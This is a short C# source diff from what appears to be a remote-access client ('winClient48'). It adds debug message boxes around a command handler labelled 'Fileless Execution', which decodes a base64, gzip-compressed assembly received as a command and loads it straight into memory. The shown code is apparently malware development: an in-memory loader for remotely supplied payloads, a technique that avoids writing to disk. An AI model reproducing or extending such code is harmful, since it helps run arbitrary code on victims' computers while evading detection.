@@ -57,6 +57,10 @@ namespace winClient48
         public Form1(string[] args)
         {
             m_args = args;
+            if (m_args.Length > 0 && m_args[0] == "mem")
+            {
+                MessageBox.Show("OK");
+            }
 
             InitializeComponent();
         }
@@ -2123,11 +2127,15 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
+                    MessageBox.Show("A");
+
                     string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                     byte[] abAssembly = Convert.FromBase64String(cmd[2]);
                     abAssembly = clsEZData.abGzipDecompress(abAssembly);
 
                     installer.fnLoadToMemory(alpArgs, abAssembly);
+
+                    MessageBox.Show("B");
                 }
 
                 #endregion
